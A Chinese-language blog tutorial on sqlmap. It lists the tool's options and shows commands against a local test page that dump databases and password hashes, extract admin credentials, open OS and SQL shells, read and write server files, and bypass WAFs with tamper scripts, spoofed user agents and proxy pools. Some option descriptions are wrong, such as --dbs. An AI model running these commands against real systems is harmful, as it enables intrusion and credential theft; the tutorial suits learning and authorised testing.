---
title: Sqlmap的使用及利用工具学习
date: 2017-10-08 21:25:48
categories:
	- tools
tags:
	- tools
---

sqlmap用来检测与利用SQL注入漏洞的免费开源工具，支持多种数据库。<!-- more -->


# SQLMAP工具的使用

## sqlmap下载与安装
```
sqlmap工具需要python2.x环境下运行。目前暂不支持python3.x
1.先下载python2.x版本 并把python路径配置为环境变量。
2.将下载好的sqlmap解压到python的安装根目录下。
```

![down](http://owrmua5nw.bkt.clouddn.com/download.png)
python – [官网](https://www.python.org/)
sqlmap – [官网](http://sqlmap.org/)
sqlmap – [官方文档](https://github.com/sqlmapproject/sqlmap/wiki/Usage#http-host-header)

## sqlmap options
```
安装完成后在cmd命令行执行命令 
sqlmap.py -h 
查看下sqlmap的配置参数如下。(私自增加了一些-hh的参数)
sqlmap当然不止这些参数啦，感兴趣的同学可以看一下上面提供的sqlmap官方文档。
```

```
Usage: sqlmap.py [options]
Options: 
  -h, --help            显示基本的帮助信息
  -hh                   显示详细的帮助信息
  --version             Show program's version number and exit
  -v VERBOSE           	回显的显示级别 默认为1
  Target:
    必须提供这些选项中的至少一个来定义目标
    -u URL, --url=URL   目标url (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs
  Request:
    这些选项可用于指定如何连接目标url。
    --data=DATA         数据以POST方式提交
    --cookie=COOKIE     HTTP Cookie header value
    --random-agent      随机选择HTTP数据包中User-Agent的值
    --user-agent        指定一个ua头
    --proxy=PROXY       使用一个代理去连接目标url
    --proxy-file        可以通过提供包含批量代理列表的文件的文件名
    来跳过连接问题的任何符号（例如阻止侵入式IP地址）的下一个代理
    --delay             指定在每个HTTP（S）请求之间保持的秒数。有效值是浮点数，例如0.5意味着半秒，默认无延迟。
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly
  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts
    -p TESTPARAMETER    指定参数
    --dbms=DBMS         指定数据库名
  Detection:
    These options can be used to customize the detection phase
    --level=LEVEL       总之检测SQL注入越困难，--level必须设置的越高。 (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)
  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques
    --technique=TECH    SQL injection techniques to use (default "BEUSTQ")
  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables. Moreover you can run your own SQL statements
    -a, --all           获取所有
    -b, --banner        获取数据库版本 or 配置环境
    --dbs    	        判断是否为管理员权限，是则返回true
    --current-user      获取数据库当前使用者用户
    --current-db        获取当前使用的数据库 
    --passwords         枚举数据库用户密码的hash值 
    --tables            枚举当前数据库的所有表
    --columns           枚举当前表中的所有列
    --schema            Enumerate DBMS schema
    --dump              dump出数据库中的数据
    --dump-all          Dump all DBMS databases tables entries
    -D DB               指定数据库名
    -T TBL              指定表名
    -C COL              指定列名
  File system access:
    These options can be used to access the back-end database management
    system underlying file system
    --file-read=RFILE   读文件
    --file-write=WFILE  写文件
    --file-dest=DFILE   服务器绝对路径
  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system
    --os-shell          返回系统交互
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
  General:
    These options can be used to set some general working parameters
    --batch             永不询问用户输入，都采用默认行为
    --flush-session     Flush session files for current target
  Miscellaneous:
    --sql-shell	        获取执行sql语句的shell
    --sqlmap-shell      Prompt for an interactive sqlmap shell
    --wizard            Simple wizard interface for beginner users
```

```
环境 phpstudy2014 + Windows10 
```

## 工具使用

### 判断注入
```
sqlmap.py -u "http://127.0.0.1/test.php?id=1"
```

![if](http://owrmua5nw.bkt.clouddn.com/%E5%88%A4%E6%96%AD1.png)

### 判断是否是dba权限
```
sqlmap.py -u "http://127.0.0.1/test.php?id=1" --is-dba
dba -- 即databaseadmin 数据库管理员
```

![dba](http://owrmua5nw.bkt.clouddn.com/dba.png)

### 获取当前使用的用户
```
sqlmap.py -u "http://127.0.0.1/test.php?id=1" --current-user
```

![user](http://owrmua5nw.bkt.clouddn.com/current-user.png)

### 获取数据库用户名密码
```
sqlmap.py -u "http://127.0.0.1/test.php?id=1" --passwords
可以枚举每个数据库管理系统用户的口令散列。
而且还将哈希格式识别为PostgreSQL，询问用户是否对字典文件进行哈希测试，
并确定postgres用户的明文密码
```

![password](http://owrmua5nw.bkt.clouddn.com/passwords.png)

### 获取所有数据库
```
sqlmap.py -u "http://127.0.0.1/test.php?id=1" --dbs
需要root权限，普通用户只能看到它所属的数据库，以及一些系统自带的。
```

![all_dbs](http://owrmua5nw.bkt.clouddn.com/all_database.png)

### 获取当前连接的数据库名
```
sqlmap.py -u "http://127.0.0.1/test.php?id=1" --current-db
```

![current_dbname](http://owrmua5nw.bkt.clouddn.com/database_name.png)

### 获取指定数据库下的所有表
```
sqlmap.py -u "http://127.0.0.1/test.php?id=1" -D test --tables
指定数据库test下的所有表
```

![all_table](http://owrmua5nw.bkt.clouddn.com/sqlmap_table.png)

### 获取指定表下的所有列
```
sqlmap.py -u "http://127.0.0.1/test.php?id=1" -D test -T admin --columns
指定数据库test 下的 admin表 下的所有字段
```

![all_columns](http://owrmua5nw.bkt.clouddn.com/columns.png)

### 获取指定列下的数据
```
sqlmap.py -u "http://127.0.0.1/test.php?id=1" -D test -T admin -C username,password --dump
```

![all_columns](http://owrmua5nw.bkt.clouddn.com/data_get.png)

### [](#指定数据库 "指定数据库")指定数据库
```
sqlmap.py -u "http://127.0.0.1/test.php?id=1" --dbms="mysql"
sqlmap支持的数据库如下：
* MySQL
* Oracle
* PostgreSQL
* Microsoft SQL Server
* Microsoft Access
* IBM DB2
* SQLite
* Firebird
* Sybase
* SAP MaxDB
* HSQLDB
* Informix
```

## sqlmap高级应用

### 获取os交互
```
sqlmap.py -u "http://127.0.0.1/test.php?id=1" --os-shell
一般是需要填写网站绝对路径的，但是这里sqlmap直接检测出来自动帮你填写了。
quit退出交互
```

![os_shell](http://owrmua5nw.bkt.clouddn.com/--os-shell.png)

### 获取sql交互
```
sqlmap.py -u "http://127.0.0.1/test.php?id=1" --sql-shell
```

![sql-shell](http://owrmua5nw.bkt.clouddn.com/-sql-shell.png)

### 读文件
```
sqlmap.py -u "http://127.0.0.1/test.php?id=1" --file-read="D:/WWW/11.txt"
指定网站的绝对路径
```

![read-file](http://owrmua5nw.bkt.clouddn.com/read_file.png)

### 写文件
```
sqlmap.py -u "http://127.0.0.1/test.php?id=1" --file-write="E:/yijuhua.txt" --file-dest="D:/WWW/lyxhh1111.txt"
将本地的文件E:/yijuhua.txt 写到服务器的D:/WWW/lyxhh1111.txt上去。lyxhh1111.txt不存在则创建
```
![xie](http://owrmua5nw.bkt.clouddn.com/xie.gif)

### POST 注入
```
sqlmap.py -u "http://127.0.0.1/test.php" --data="id=1"
data="post的参数"
多个参数用&符号连接。
```

### COOKIE注入
```
sqlmap.py -u "http://127.0.0.1/test.php" --cookie="id=1" --level 2
cookie注入必须指定level级别>=2
```

### 星号的使用
```
sqlmap不会对URI路径执行任何自动测试，
像类似伪静态这种，那么就可以用*号来指定，
即存在注入点的地方加多一个*，post,cookie相同
（注意：%INJECT HERE%还支持Havij样式）在命令行中指定这些注入点。
sqlmap.py -u "http://127.0.0.1/test.php?id=1*" --batch
```
![星号](http://owrmua5nw.bkt.clouddn.com/%E6%98%9F%E5%8F%B7.png)

### 从文件加载HTTP请求 结合*使用 ——指定注入参数
```
sqlmap.py -r C:\\Users\\xiaohao\\Desktop\111.txt
Cookie post 都是浮云。
```

![http](http://owrmua5nw.bkt.clouddn.com/http.png)
![httpdata](http://owrmua5nw.bkt.clouddn.com/http%E5%A4%B4.png)

### user-agent的使用
```
sqlmap.py -u "http://127.0.0.1/test.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
绕不过的话加个代理池，加个延迟还不是美滋滋。
```

![ua](http://owrmua5nw.bkt.clouddn.com/ua.png)
![uanwe](http://owrmua5nw.bkt.clouddn.com/ua_new.png)

### tamper模块的使用
```
在sqlmap目录下有一个tamper文件夹，sqlmap允许我们定制自己的篡改脚本。即自定义sql语句。
用以绕过某些昂贵的企业级IPS设备或Web应用程序防火墙（WAF）调用的自行开发的输入验证例程
sqlmap也提供了一些脚本供我们使用，但是过waf的基本失效了。
若你要写过狗的话可以更改它以前的过狗脚本，或者自写一个python脚本用正则函数一个个替换。
sqlmap.py -u "http://127.0.0.1/test.php?id=1" --tamper="versionedkeywords"  
指定脚本的名称
```

![tamper](http://owrmua5nw.bkt.clouddn.com/tamper.png)
![tamper1](http://owrmua5nw.bkt.clouddn.com/tamper1.png)

# 利用sqlmap工具学习

## 结合Burp Suite抓包一个个解码学习

![Burp](http://owrmua5nw.bkt.clouddn.com/Burp.png)

## 利用sqlmap -v参数

![v](http://owrmua5nw.bkt.clouddn.com/2222.gif)
```
-v3可以很清楚的看到sqlmap构造的pyload
如果觉得sqlmap构造的pyload太复杂，可以尝试使用其他工具学习，例如：Havij等。
sqlmap目录下面有个waf目录可以去瞧瞧。
个人理解，仅供参考。
```
    